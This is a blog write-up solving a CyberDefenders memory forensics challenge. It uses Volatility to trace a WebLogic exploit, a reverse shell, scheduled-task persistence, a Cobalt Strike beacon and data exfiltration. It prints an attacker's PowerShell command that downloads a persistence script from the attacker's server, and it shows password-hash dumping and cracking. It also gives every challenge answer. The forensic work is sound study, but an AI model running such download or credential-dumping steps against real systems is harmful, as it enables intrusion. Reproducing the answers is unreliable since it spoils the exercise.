---
title: BSides Jeddah Part 2
date: 2022-01-23 12:00:00 -500
categories: [writeups, CyberDefenders]
tags: [volatility, memory forensics, cobalt strike, Forensics]
---
# Solutions to BSidesJeddah-Part2 from Cyberdefenders.org
## Contents
1. [Question 1](#question-1)
2. [Question 2](#question-2)
3. [Question 3](#question-3)
4. [Question 4](#question-4)
5. [Question 5](#question-5)
6. [Question 6](#question-6)
7. [Question 7](#question-7)
8. [Question 8](#question-8)
9. [Question 9](#question-9)
10. [Question 10](#question-10)
11. [Question 11](#question-11)
12. [Question 12](#question-12)
13. [Question 13](#question-13)
14. [Question 14](#question-14)
15. [Question 15](#question-15)
16. [Question 16](#question-16)
17. [Question 17](#question-17)
18. [Question 18](#question-18)
19. [Question 19](#question-19)
20. [Question 20](#question-20)
21. [Question 21](#question-21)

## <b> 1. What is the SHA256 hash value of the RAM image?</b> <a name = "question-1"> </a>
    sha256sum memory.mem
<details>
    <summary> <b>Solution </b> </summary>
    5b3b1e1c92ddb1c128eca0fa8c917c16c275ad4c95b19915a288a745f9960f39
</details>

## <b> 2. What time was the RAM image acquired according to the suspect system?</b> <a name = "question-2"> </a>
For this question, I used volatility 3, rather than volatility 2. I used the below command to get the time:

    vol -f memory.mem windows.info
<details>
    <summary> <b>Solution </b> </summary>
    2021-08-06 16:13:23
</details>

## <b> 3. What volatility2 profile is the most appropriate for this machine? </b> <a name = "question-3"> </a>
Back to volatility 2 for this question. I used the below command to get the profile. It takes a while so be patient:

    vol.py -f memory.mem imageinfo
<details> 
    <summary> <b>Solution </b> </summary>
    Win2016x64_14393
</details>

## <b> 4. What is the computer's name? </b> <a name = "question-4"> </a>
There were multiple ways to do this. I examined the registry and used the following commands to get the computer's name:

    vol.py -f memory.mem --profile=Win2016x64_14393 hivelist

I then used hivedump with the offset found from the previous command, and used grep to find the computer's name:

    vol.py -f memory.mem --profile=Win2016x64_14393 hivedump -o 0xffff808fe7e41000 | grep "ComputerName"

After finding the ComputerName hive key in the registry, I used the following command to get the computer's name:

    vol.py -f memory.mem --profile=Win2016x64_14393 printkey -o 0xffff808fe7e41000 -K “ControlSet001\Control\ComputerName\ComputerName”
<details>
    <summary> <b>Solution </b> </summary>
    WIN-8QOTRH7EMHC
</details>

## <b> 5. What is the system IP address? </b> <a name = "question-5"> </a>
Continuing to use volatility 2 here. I used the following command to get the system IP address:

    vol.py -f memory.mem --profile=Win2016x64_14393 netscan
<details>
    <summary> <b>Solution </b> </summary>
    192.168.144.131
</details>

## <b> 6. How many established network connections were at the time of acquisition? </b> <a name = "question-6"> </a>
I used the following command to get the number of established network connections:

    vol.py -f memory.mem --profile=Win2016x64_14393 netscan | grep "ESTABLISHED" | wc -l 
<details>  
    <summary> <b>Solution </b> </summary>
    12
</details>

## <b> 7. What is the PID of explorer.exe? </b> <a name = "question-7"> </a>
I used the following command to get the PID of explorer.exe:

    vol.py -f memory.mem --profile=Win2016x64_14393 pslist | grep "explorer.exe" | awk '{print $2}'
<details>
    <summary> <b>Solution </b> </summary>
    2676
</details>

## <b> 8. What is the title of the webpage the admin visited using IE? </b><a name = "question-8"> </a>
I used the following command to get the title of the webpage the admin visited using IE:

    vol.py -f memory.mem --profile=Win2016x64_14393 iehistory
<details>
    <summary> <b>Solution </b> </summary>
    Google News
</details>

## <b>9. What company developed the program used for memory acquisition? </b> <a name = "question-9"> </a>
Back to volatility 3 for this question. I used the windows.cmdline plugin to determine the programs ran from the command line at the time of acquisition:

    vol -f memory.mem windows.cmdline

This reveals a process called "ramcapture64.exe" was run. Some cursory googling reveals that this program was developed by: 
<details>
    <summary> <b>Solution </b> </summary>
    Belkasoft
</details>

## <b> 10. What is the administrator user password? </b> <a name = "question-10"> </a>
Continuing with volatility 3, I used the following command to get the administrator user password:

    vol -f memory.mem windows.hashdump.Hashdump

this gives us the NTLM hash of the administrator's password. Running them through crackstation.net reveals the password is:
<details>
    <summary> <b>Solution </b> </summary>
    52(dumbledore)oxim
</details>

## <b> 11. What is the version of the WebLogic server installed on the system?</b> <a name = "question-11"> </a>
There was definitely a way I was meant to do this, however I left it till the end and came back to it later on. After answering [question 16](#question-16), I figured out the version of WebLogic from the CVE posting on exploitdb.
<details>
    <summary> <b>Solution </b> </summary>
    14.1.1.0.0
</details>

## <b> 12. The admin set a port forward rule to redirect the traffic from the public port to the WebLogic admin portal port. What is the public and WebLogic admin portal port number? </b> <a name = "question-12"> </a>
I used volatility 3 here again. I used the following command to get the public and WebLogic admin portal port number:

    vol -f memory.mem --profile=Win2016x64_14393 netscan | grep "LISTENING"

This provided a variety of results, however the solution field on the website indicates that the format of the answer will be "**:****" so the public port is only 2 digits, and the WebLogic port is 4 digits. Testing the various combinations from the output of the above command, the correct combination was: 
<details>
    <summary> <b>Solution </b> </summary>
    80:7001
</details>

## <b> 13. The attacker gain access through WebLogic Server. What is the PID of the process responsible for the initial exploit? </b> <a name = "question-13"> </a>
More fun with volatility 3, I used the following command to view the processes that were running at the time of acquisition:

    vol -f memory.mem windows.pslist
Looking through this output, and noting that the process running from the portforwarding in the previous question was java.exe, I determined the PID of this process to be: 
<details>
    <summary> <b>Solution </b> </summary>
    4752
</details>

## <b> 14. What is the PID of the next entry to the previous process? </b> <a name = "question-14"> </a>
Continuing to look at the output from the above command, simply determine which process was run just before the one identified in [Question 13](#question-13).
<details>
    <summary> <b>Solution </b> </summary>
    4772
</details>

## <b> 15. How many threads does the previous process have? </b> <a name = "question-15"> </a>
Again, just like the last question, look at the output of the command from [Question 13](#question-13) and determine the number of threads the process has.
<details>
    <summary> <b>Solution </b> </summary>
    44
</details>

## <b> 16. The attacker gain access to the system through the webserver. What is the CVE number of the vulnerability exploited? </b> <a name = "question-16"> </a>
Here, all I did was some googling. I looked for "WebLogic CVE java" since the exploit was run with java.exe and the webserver was running WebLogic. This took some time, but eventually I found the correct one on exploitdb. The CVE number for this vulnerability is:
<details>
    <summary> <b>Solution </b> </summary>
    CVE-2020-14882 
</details>

## <b> 17. The attacker used the vulnerability he found in the webserver to execute a reverse shell command to his own server. Provide the IP and port of the attacker server? </b> <a name = "question-17"> </a>
Running the command, where \*PID\* is the PID from [question 13](#question-13): 
    
    vol -f memory.mem windows.pstree | grep *PID* 
The output of this command indicates that java.exe spawned a series of powershell.exe processes. My next step was to run the windows.cmdline plugin again to see if that yielded any information about the powershell scripts being run:

    vol -f memory.mem windows.cmdline | grep powershell.exe
In this output, there was some suspicious gibberish. I suspected that it was base64 encoded. Using CyberChef, I decoded the output and found the attacker's IP address and port:
<details>
    <summary> <b>Solution </b> </summary>
    192.168.144.129:1339
</details>

## <b> 18. Multiple files were downloaded from the attacker’s web server. Provide the command used to download the Powershell script used for persistence? </b> <a name = "question-18"> </a>
Running the windows.netscan plugin again, however in this case I used grep to search for the IP address found in the previous question (written in the command as \*IP\*). 
    
    vol -f memory.mem windows.netscan | grep "*IP*"

The output of this command indicates that powershell was run from this process. Given that, I went back to volatility 2 to see if I could dump some of the powershell that was run. To do so I used the following command:

    vol.py -f memory.mem --profile=Win2016x64_14393 memdump -n powershell.exe -D ./

Then, running strings on all of the *.dmp files that were created, yielded a bunch of useless information. To narrow down my strings search, I looked only for strings containing ".ps1":
    
        strings *.dmp | grep ".ps1"
Within this output there was mention of a file titled "presist.ps1" being downloaded from the attackers webserver.

<details>
    <summary> <b>Solution </b> </summary>
     Invoke-WebRequest -Uri "http://192.168.144.129:1338/presist.ps1" -OutFile "./presist.ps1"
</details>

## <b> 19. What is the MITRE ID related ot the persistence technique the attacker used?> </b> <a name = "question-19"> </a>
After consulting the ATT&CK framework's tab on persistence, I felt like the most likely answer was the "scheduled task/job". This is given the existence of tasksch.msc within the process list output from a variety of previous questions. Looking through the sub-techniques, we can rule out those that only apply to Linux/Unix systems. This leaves T1053.002, 005, or 007. 

<b> 002:</b > at.exe was not present in the process list output from the previous questions, so we can rule out T1053.002.

<b> 007:</b > This type of scheduled task persistence is unique to container environments. Think kubernetes. I have no reason to believe that this memory dump existed on a virtualized environment within a container. so we can rule out T1053.007.

This leaves just T1053.005. Reading through the documentation for this sub-technique, I found that the attacker used the "scheduled task" technique, specifically the Windows Task Scheduler to persist the powershell script.

<details>
    <summary> <b>Solution </b> </summary>
    T1053.005
</details>

## <b> 20. WAfter maintaining persistence, the attacker dropped a cobalt strike beacon. Try to analyze and provide the Publickey_MD5.</b> <a name = "question-20"> </a> 
Given that cobalt strike is a well known C2 Framework, it's likely that the windows.malfind plugin in volatility 3 will identify malicious processes. I ran the below command:

    vol -f memory.mem windows.malfind

Most of the processes listed are inconsequential. The only one that caught my eye was 1488. Using the procdump plugin from volatility 2 so I can analyze further:
    
    vol -f memory.mem -o ./ windows.memmap --pid 1488 --dump

I installed Sentinel One's Cobalt Strike parser which can be found [here](https://github.com/Sentinel-One/CobaltStrikeParser). I ran it against the dump file from the previous command. 

    python3 parse_beacon_config.py pid.1488.dmp
In the output of this command is the public key MD5 hash. 

<details>
    <summary> <b>Solution </b> </summary>
    fc627cf00878e4d4f7997cb26a80e6fc
</details>

## <b> 21. What is the URL of the exfiltrated data? </b> <a name = "question-21"> </a>
I noted earlier during a variety of the previous challenges that notepad.exe was another of the running processes. Purely out of curiosity, I dumped the memory of notepad.exe and did some digging. 

    vol.py -f memory.mem --profile=Win2016x64_14393 memdump -n notepad.exe -D ./
Running strings on this output gave me way too much to work with so I started filtering with some grep-foo. Given the nature of the question, I got lucky with:
    
    strings -e l 4536.dmp | grep "exfil"

This uncovered the string "exfiltrator.exe". Some more grep-foo...
        
        strings -e l 4536.dmp | grep "exfiltrator.txt" -A2
And voila, a line below the exfiltrator.txt string:
        
<details>
    <summary> <b>Solution </b> </summary>
     https://pastebin.com/A0Ljk8tu
</details  >